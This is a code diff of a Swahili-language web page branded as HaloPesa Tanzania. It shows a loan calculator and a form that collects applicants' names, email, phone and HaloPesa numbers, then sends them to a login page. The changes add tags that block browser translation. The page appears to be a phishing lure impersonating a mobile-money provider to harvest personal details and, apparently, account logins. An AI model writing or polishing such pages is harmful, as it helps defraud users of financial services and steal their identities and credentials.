@@ -1,8 +1,10 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="sw" translate="no">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- BLOCK TRANSLATION -->
   <meta name="google" content="notranslate">
 
   <title>HaloPesa Tanzania</title>
@@ -14,16 +16,14 @@
 
   <!-- HEADER -->
   <header class="topbar">
-
     <div class="menu">☰</div>
 
     <div class="logo">
       <span class="orange">Halo</span><span class="yellow">Pesa</span>
     </div>
-
   </header>
 
-  <!-- MAIN CARD -->
+  <!-- MAIN -->
   <div class="container">
 
     <div class="card">
@@ -34,7 +34,7 @@
         Idhini ya haraka • Riba nafuu • Muda rahisi
       </p>
 
-      <!-- LOAN CALCULATOR -->
+      <!-- CALCULATOR -->
       <div class="loan-box">
 
         <div class="label-row">
@@ -42,14 +42,7 @@
           <strong id="amountText">TSh 100,000</strong>
         </div>
 
-        <input
-          type="range"
-          min="10000"
-          max="1000000"
-          value="100000"
-          step="10000"
-          id="loanAmount"
-        >
+        <input type="range" min="10000" max="1000000" value="100000" step="10000" id="loanAmount">
 
         <div class="range-labels">
           <span>TSh 10K</span>
@@ -63,20 +56,14 @@
           <strong id="monthText">Miezi 12</strong>
         </div>
 
-        <input
-          type="range"
-          min="1"
-          max="24"
-          value="12"
-          id="loanMonths"
-        >
+        <input type="range" min="1" max="24" value="12" id="loanMonths">
 
         <div class="range-labels">
           <span>Mwezi 1</span>
           <span>Miezi 24</span>
         </div>
 
-        <!-- MONTHLY PAYMENT -->
+        <!-- PAYMENT -->
         <div class="payment-box">
           <p>Malipo ya Kila Mwezi</p>
           <h2 id="monthlyPayment">TSh 9,500</h2>
@@ -89,22 +76,19 @@
       </button>
 
     </div>
-
   </div>
 
-  <!-- APPLICATION FORM -->
+  <!-- FORM -->
   <div class="form-container" id="formPage" style="display:none;">
 
     <div class="form-card">
 
       <h1>Maombi ya Mkopo</h1>
-
       <p class="step">Hatua 1 ya 3</p>
 
       <form id="loanForm">
 
         <label>Aina ya Mkopo</label>
-
         <select required>
           <option>Mkopo wa Biashara</option>
           <option>Mkopo wa Dharura</option>
@@ -112,15 +96,9 @@
         </select>
 
         <label>Kiasi cha Mkopo (TSh)</label>
-
-        <input
-          type="number"
-          placeholder="100000"
-          required
-        >
+        <input type="number" placeholder="100000" required>
 
         <label>Muda wa Mkopo</label>
-
         <select required>
           <option>Miezi 3</option>
           <option>Miezi 6</option>
@@ -128,51 +106,23 @@
           <option>Miezi 24</option>
         </select>
 
-        <label>Namba ya Simu</label>
-
-        <input
-          type="tel"
-          placeholder="07XXXXXXXX"
-          required
-        >
+        <label>Nambari ya Simu</label>
+        <input type="tel" placeholder="07XXXXXXXX" required>
 
         <label>Madhumuni ya Mkopo</label>
-
-        <textarea
-          placeholder="Elezea matumizi ya mkopo wako"
-        ></textarea>
+        <textarea placeholder="Elezea matumizi ya mkopo wako"></textarea>
 
         <label>Jina la Kwanza</label>
-
-        <input
-          type="text"
-          placeholder="Ingiza jina la kwanza"
-          required
-        >
+        <input type="text" required>
 
         <label>Jina la Pili</label>
-
-        <input
-          type="text"
-          placeholder="Ingiza jina la pili"
-          required
-        >
+        <input type="text" required>
 
         <label>Barua Pepe</label>
+        <input type="email" required>
 
-        <input
-          type="email"
-          placeholder="mfano@gmail.com"
-          required
-        >
-
-        <label>Nambari ya Simu (Halopesa)</label>
-
-        <input
-          type="tel"
-          placeholder="07XXXXXXXX"
-          required
-        >
+        <label>Namba ya Halopesa</label>
+        <input type="tel" placeholder="07XXXXXXXX" required>
 
         <br><br>
 
@@ -186,30 +136,46 @@
 
   </div>
 
+  <!-- JAVASCRIPT -->
   <script>
+    const amountSlider = document.getElementById("loanAmount");
+    const monthSlider = document.getElementById("loanMonths");
+
+    const amountText = document.getElementById("amountText");
+    const monthText = document.getElementById("monthText");
+    const paymentText = document.getElementById("monthlyPayment");
+
+    function updateLoan() {
+
+      const amount = parseInt(amountSlider.value);
+      const months = parseInt(monthSlider.value);
+
+      amountText.innerText = "TSh " + amount.toLocaleString();
+      monthText.innerText = "Miezi " + months;
+
+      const interest = 0.14;
+      const total = amount + (amount * interest);
+      const monthly = total / months;
+
+      paymentText.innerText = "TSh " + Math.round(monthly).toLocaleString();
+    }
+
+    amountSlider.addEventListener("input", updateLoan);
+    monthSlider.addEventListener("input", updateLoan);
+
+    updateLoan();
 
     function openForm() {
-
+      document.querySelector(".container").style.display = "none";
       document.getElementById("formPage").style.display = "block";
-
-      window.scrollTo({
-        top: document.getElementById("formPage").offsetTop,
-        behavior: "smooth"
-      });
-
     }
 
     document.getElementById("loanForm").addEventListener("submit", function(e) {
-
       e.preventDefault();
-
       window.location.href = "login.html";
-
     });
 
   </script>
-
-  <script src="script.js"></script>
 
 </body>
 </html>
